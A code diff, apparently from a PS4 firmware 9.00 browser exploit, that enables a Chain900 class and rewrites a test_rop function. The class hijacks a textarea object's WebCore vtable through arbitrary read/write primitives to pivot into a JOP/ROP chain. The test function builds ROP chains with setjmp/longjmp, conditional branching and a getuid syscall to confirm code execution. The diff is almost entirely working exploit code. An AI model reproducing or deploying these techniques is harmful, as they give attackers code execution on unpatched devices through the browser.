@@ -471,7 +471,7 @@ class Chain900Base extends ChainBase {
 const rop_ta = document.createElement('textarea');
 
 // Chain for PS4 9.00
-/*class Chain900 extends Chain900Base {
+class Chain900 extends Chain900Base {
     constructor() {
         super();
 
@@ -541,71 +541,6 @@ const rop_ta = document.createElement('textarea');
         this.ta_clone.scrollLeft;
     }
 }
-const Chain = Chain900;*/
-
-// Chain for PS4 9.00
-class Chain900 extends Chain900Base {
-    constructor() {
-        super();
-
-        const textarea = document.createElement('textarea');
-        this.textarea = textarea;
-        const js_ta = mem.addrof(textarea);
-        const webcore_ta = js_ta.readp(0x18);
-        this.webcore_ta = webcore_ta;
-        // Only offset 0x1c8 will be used when calling the scrollLeft getter
-        // native function (our tests don't crash).
-        //
-        // This implies we don't need to know the exact size of the vtable and
-        // try to copy it as much as possible to avoid a crash due to missing
-        // vtable entries.
-        //
-        // So the rest of the vtable are free for our use.
-        const vtable = new Uint8Array(0x200);
-        const old_vtable_p = webcore_ta.readp(0);
-        this.vtable = vtable;
-        this.old_vtable_p = old_vtable_p;
-
-        // 0x1b8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable, 0x1b8, this.get_gadget(jop1));
-        rw.write64(vtable, 0xb8, this.get_gadget(jop2));
-        rw.write64(vtable, 0x1c, this.get_gadget(jop3));
-
-        // for the JOP chain
-        const rax_ptrs = new Uint8Array(0x100);
-        const rax_ptrs_p = get_view_vector(rax_ptrs);
-        this.rax_ptrs = rax_ptrs;
-
-        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
-        // value to pivot rsp to
-        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);
-
-        const jop_buffer = new Uint8Array(8);
-        const jop_buffer_p = get_view_vector(jop_buffer);
-        this.jop_buffer = jop_buffer;
-
-        rw.write64(jop_buffer, 0, rax_ptrs_p);
-
-        rw.write64(vtable, 8, jop_buffer_p);
-    }
-
-    run() {
-        this.check_stale();
-        this.check_is_empty();
-        this.check_is_branching();
-
-        // change vtable
-        this.webcore_ta.write64(0, get_view_vector(this.vtable));
-        // jump to JOP chain
-        this.textarea.scrollLeft;
-        // restore vtable
-        this.webcore_ta.write64(1, this.old_vtable_p);
-    }
-}
 const Chain = Chain900;
 
 function init(Chain) {
@@ -619,7 +554,7 @@ function init(Chain) {
     Chain.init_class(gadgets, syscall_array);
 }
 
-function test_rop(Chain) {
+/*function test_rop(Chain) {
     const jmp_buf = new Uint8Array(jmp_buf_size);
     const jmp_buf_p = get_view_vector(jmp_buf);
 
@@ -730,6 +665,121 @@ function test_rop(Chain) {
 
     debug_log(`return value: ${res}`);
     if (res.eq(magic)) {
+        die('syscall getuid failed');
+    }
+}*/
+
+function test_rop(Chain) {
+    const jmp_buf = new Uint8Array(jmp_buf_size);
+    const jmp_buf_p = get_view_vector(jmp_buf);
+
+    init(Chain);
+
+    setjmp_addr = gadgets.get('setjmp');
+    longjmp_addr = gadgets.get('longjmp');
+
+    const chain = new Chain();
+    // Instead of writing to the jmp_buf, set rax here so it will be restored
+    // as the return value after the longjmp().
+    chain.push_gadget('pop rax; ret');
+    chain.push_constant(1);
+    chain.push_call(setjmp_addr, jmp_buf_p);
+
+    chain.start_branch();
+
+    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
+    chain.push_call(longjmp_addr, jmp_buf_p);
+
+    chain.end_branch();
+
+    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
+    chain.push_end();
+
+    // The ROP chain is a noop. If we crashed, then we did something wrong.
+    //alert('chain run');
+    debug_log('test call setjmp()/longjmp()');
+    chain.run()
+    alert('ROP chain returned successfully');
+    debug_log('ROP chain returned successfully');
+    debug_log('jmp_buf:');
+    debug_log(jmp_buf);
+    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);
+
+    const state1 = new Uint8Array(8);
+    debug_log('test if rax == 0');
+    chain.clean();
+
+    chain.push_gadget('pop rsi; ret');
+    chain.push_value(get_view_vector(state1));
+    chain.push_save();
+    chain.push_gadget('pop rax; ret');
+    chain.push_constant(0);
+
+    chain.start_branch();
+    chain.push_restore();
+
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(1);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.end_branch();
+
+    chain.push_restore(true);
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(2);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.run();
+    debug_log(`state1 must be 1: ${state1}`);
+    if (state1[0] !== 1) {
+        die('if branch not taken');
+    }
+
+    const state2 = new Uint8Array(9);
+    debug_log('test if rax != 0');
+    chain.clean();
+
+    chain.push_gadget('pop rsi; ret');
+    chain.push_value(get_view_vector(state2));
+    chain.push_save();
+    chain.push_gadget('pop rax; ret');
+    chain.push_constant(1);
+
+    chain.start_branch();
+    chain.push_restore();
+
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(1);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.end_branch();
+
+    chain.push_restore(true);
+    chain.push_gadget('pop rcx; ret');
+    chain.push_constant(2);
+    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+    chain.push_end();
+
+    chain.run();
+    debug_log(`state2 must be 2: ${state2}`);
+    if (state2[0] !== 2) {
+        die('if branch taken');
+    }
+
+    debug_log('test syscall getuid()');
+    chain.clean();
+    // Set the return value to some random value. If the syscall worked, then
+    // it will likely change.
+    const magic = 0x4b4355467;
+    rw.write32(chain._return_value, 0, magic);
+
+    chain.syscall('getuid');
+
+    debug_log(`return value: ${chain.return_value}`);
+    if (chain.return_value.low() === magic) {
         die('syscall getuid failed');
     }
 }
